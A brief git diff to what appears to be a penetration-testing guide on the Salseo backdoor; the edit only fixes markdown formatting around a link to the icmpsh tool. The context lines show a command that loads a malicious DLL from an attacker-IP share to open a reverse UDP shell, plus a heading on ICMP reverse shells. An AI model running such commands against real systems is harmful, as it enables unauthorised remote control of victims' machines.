@@ -62,7 +62,7 @@ SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <A
 
 ### **Getting a ICMP reverse shell (encoded dll already inside the victim)**
 
-**This time you need a special tool in the client to receive the reverse shell. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)****
+**This time you need a special tool in the client to receive the reverse shell. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **Disable ICMP Replies:**
 
